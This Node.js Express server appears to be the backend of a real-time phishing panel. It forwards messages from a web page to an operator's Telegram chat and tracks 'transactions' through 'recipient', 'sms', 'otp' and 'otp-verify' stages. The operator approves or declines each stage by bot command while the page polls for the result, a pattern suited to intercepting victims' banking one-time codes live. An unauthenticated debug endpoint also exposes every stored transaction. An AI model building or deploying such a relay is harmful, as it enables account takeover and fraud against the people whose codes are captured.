const express = require('express');
const path = require('path');
const app = express();

app.use(express.json({ limit: '1mb' }));
app.use(express.static(__dirname));

const BOT_TOKEN = () => process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = () => process.env.TELEGRAM_CHAT_ID;

// ============================================================
// TRANSACTION STATE STORE
// ============================================================
// Structure:
//   txnId -> {
//     status: 'pending' | 'approved' | 'declined',
//     stage: string,       // 'recipient' | 'sms' | 'otp' | 'otp-verify'
//     createdAt: number,
//     updatedAt: number,
//     history: [{ stage, status, at }]
//   }
const transactions = new Map();

// Auto-clean transactions older than 1 hour to avoid memory growth
setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const [id, txn] of transactions.entries()) {
    if (txn.updatedAt < cutoff) transactions.delete(id);
  }
}, 5 * 60 * 1000); // every 5 min

// ============================================================
// TELEGRAM HELPERS
// ============================================================
async function sendTelegram(text, replyMarkup = null) {
  if (!BOT_TOKEN() || !CHAT_ID()) {
    console.warn('⚠️ Telegram not configured — message logged only');
    console.log(text);
    return { ok: false, error: 'Telegram not configured' };
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN()}/sendMessage`;
    const body = {
      chat_id: CHAT_ID(),
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...(replyMarkup ? { reply_markup: replyMarkup } : {})
    };
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await res.json();
    if (!data.ok) console.error('Telegram API error:', data);
    return data;
  } catch (err) {
    console.error('Telegram send error:', err.message);
    return { ok: false, error: err.message };
  }
}

// ============================================================
// API: SEND MESSAGE + REGISTER TRANSACTION
// ============================================================
app.post('/api/telegram', async (req, res) => {
  try {
    const { message, reply_markup, txnId, stage } = req.body;

    if (!message) {
      return res.status(400).json({ ok: false, error: 'No message' });
    }

    // Register / update transaction state
    if (txnId) {
      const existing = transactions.get(txnId) || {
        createdAt: Date.now(),
        history: []
      };
      existing.status = 'pending';
      existing.stage = stage || existing.stage || 'unknown';
      existing.updatedAt = Date.now();
      existing.history.push({
        stage: existing.stage,
        status: 'pending',
        at: Date.now()
      });
      transactions.set(txnId, existing);
    }

    const data = await sendTelegram(message, reply_markup || null);
    res.json({ ok: true, telegram: data });
  } catch (err) {
    console.error('Send error:', err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ============================================================
// API: CHECK TRANSACTION STATUS
// ============================================================
app.get('/api/status/:txnId', (req, res) => {
  const txn = transactions.get(req.params.txnId);
  if (!txn) {
    return res.json({ status: 'unknown', stage: null });
  }
  res.json({
    status: txn.status,
    stage: txn.stage,
    updatedAt: txn.updatedAt
  });
});

// ============================================================
// API: RESET TRANSACTION (for resend flows)
// ============================================================
app.post('/api/reset/:txnId', (req, res) => {
  const txn = transactions.get(req.params.txnId);
  if (txn) {
    txn.status = 'pending';
    txn.updatedAt = Date.now();
    txn.history.push({ stage: txn.stage, status: 'reset', at: Date.now() });
    transactions.set(req.params.txnId, txn);
  }
  res.json({ ok: true });
});

// ============================================================
// TELEGRAM POLLING — LISTEN FOR /approve AND /decline
// ============================================================
let lastUpdateId = 0;
let polling = false;

async function pollTelegram() {
  if (!BOT_TOKEN()) {
    // Retry later if not yet configured
    setTimeout(pollTelegram, 10000);
    return;
  }
  if (polling) return;
  polling = true;

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN()}/getUpdates?timeout=20&offset=${lastUpdateId + 1}`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;

        const msg = update.message || update.edited_message || update.channel_post;
        if (!msg || !msg.text) continue;

        // Security: only accept commands from the configured chat
        if (String(msg.chat.id) !== String(CHAT_ID())) {
          console.warn('Ignored message from unknown chat:', msg.chat.id);
          continue;
        }

        const text = msg.text.trim();

        // Match /approve <txnId>  OR  /approve@BotName <txnId>
        const approveMatch = text.match(/^\/approve(?:@\w+)?\s+(\S+)/i);
        const declineMatch = text.match(/^\/decline(?:@\w+)?\s+(\S+)/i);

        if (approveMatch) {
          handleDecision(approveMatch[1], 'approved');
        } else if (declineMatch) {
          handleDecision(declineMatch[1], 'declined');
        }
      }
    }
  } catch (err) {
    console.error('Poll error:', err.message);
  }

  polling = false;
  setTimeout(pollTelegram, 1500); // poll again in 1.5s
}

async function handleDecision(txnId, decision) {
  const txn = transactions.get(txnId);
  if (!txn) {
    await sendTelegram(`⚠️ Unknown transaction: <code>${txnId}</code>`);
    return;
  }

  txn.status = decision;
  txn.updatedAt = Date.now();
  txn.history.push({ stage: txn.stage, status: decision, at: Date.now() });
  transactions.set(txnId, txn);

  const emoji = decision === 'approved' ? '✅' : '❌';
  const label = decision === 'approved' ? 'APPROVED' : 'DECLINED';

  await sendTelegram(`${emoji} <b>${label}</b>
<b>Txn:</b> <code>${txnId}</code>
<b>Stage:</b> ${txn.stage}
<b>🕒 ${new Date().toLocaleString('en-GB')}</b>`);
}

// ============================================================
// OPTIONAL: /status COMMAND ON TELEGRAM
// ============================================================
async function handleStatusCommand() {
  if (transactions.size === 0) {
    await sendTelegram('📋 No active transactions.');
    return;
  }
  const lines = ['📋 <b>Recent transactions</b>', '━━━━━━━━━━━━━━━━━━━━'];
  const sorted = [...transactions.entries()].sort((a, b) => b[1].updatedAt - a[1].updatedAt).slice(0, 10);
  for (const [id, txn] of sorted) {
    const emoji = txn.status === 'approved' ? '✅' : txn.status === 'declined' ? '❌' : '⏳';
    lines.push(`${emoji} <code>${id}</code> — ${txn.stage} (${txn.status})`);
  }
  await sendTelegram(lines.join('\n'));
}

// Extend the poller to also handle /status
async function pollTelegramExtended() {
  if (!BOT_TOKEN()) {
    setTimeout(pollTelegramExtended, 10000);
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN()}/getUpdates?timeout=20&offset=${lastUpdateId + 1}`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;
        const msg = update.message || update.edited_message;
        if (!msg || !msg.text) continue;
        if (String(msg.chat.id) !== String(CHAT_ID())) continue;

        const text = msg.text.trim();

        if (/^\/status(?:@\w+)?$/i.test(text)) {
          await handleStatusCommand();
          continue;
        }
        if (/^\/help(?:@\w+)?$/i.test(text)) {
          await sendTelegram(`🤖 <b>Bot commands</b>

<b>/approve</b> <code>&lt;txnId&gt;</code> — approve current stage
<b>/decline</b> <code>&lt;txnId&gt;</code> — decline current stage
<b>/status</b> — list recent transactions
<b>/help</b> — show this message`);
          continue;
        }

        const approveMatch = text.match(/^\/approve(?:@\w+)?\s+(\S+)/i);
        const declineMatch = text.match(/^\/decline(?:@\w+)?\s+(\S+)/i);

        if (approveMatch) handleDecision(approveMatch[1], 'approved');
        else if (declineMatch) handleDecision(declineMatch[1], 'declined');
      }
    }
  } catch (err) {
    console.error('Poll error:', err.message);
  }
  setTimeout(pollTelegramExtended, 1500);
}

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/health', (req, res) => {
  res.json({
    ok: true,
    telegramConfigured: !!(BOT_TOKEN() && CHAT_ID()),
    activeTransactions: transactions.size,
    uptime: Math.floor(process.uptime())
  });
});

// ============================================================
// DEBUG ENDPOINT (optional — remove in production if you want)
// ============================================================
app.get('/api/debug/txns', (req, res) => {
  const arr = [...transactions.entries()].map(([id, txn]) => ({ id, ...txn }));
  res.json(arr);
});

// ============================================================
// SERVE INDEX.HTML FOR ALL OTHER ROUTES
// ============================================================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================================
// START SERVER + POLLER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`   Telegram configured: ${!!(BOT_TOKEN() && CHAT_ID())}`);
  console.log(`   Started Telegram poller...`);
  // Give the server a moment to boot, then start polling
  setTimeout(pollTelegramExtended, 2000);
});
